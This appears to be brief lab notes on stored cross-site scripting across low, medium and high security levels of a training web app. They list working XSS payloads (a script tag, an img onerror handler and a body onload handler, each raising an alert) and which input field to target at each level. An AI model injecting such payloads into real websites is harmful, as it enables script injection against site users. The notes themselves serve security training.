# XSS Stored
## Level Low Security
```javascript
<script>alert("ZXX")</script>
// Script will stored on server.
```

## Level Medium Security
```javascript
// Message textarea not injections
// Use Name input tag and change tag size
```

## Level High Security
```javascript
// Use HTML Tags for Xss
<img src=ee onerror=alert("xss")>
<body onload=alert("xss")>
// On message testarea is not Vulnerable
// Use Name input tag
```
